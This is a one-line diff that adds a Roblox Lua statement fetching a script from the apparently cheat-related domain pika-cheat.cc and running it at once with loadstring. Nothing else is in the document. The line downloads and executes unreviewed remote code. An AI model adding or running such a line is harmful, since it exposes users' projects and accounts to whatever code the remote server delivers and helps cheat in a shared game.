@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://pika-cheat.cc/script.lua"))();
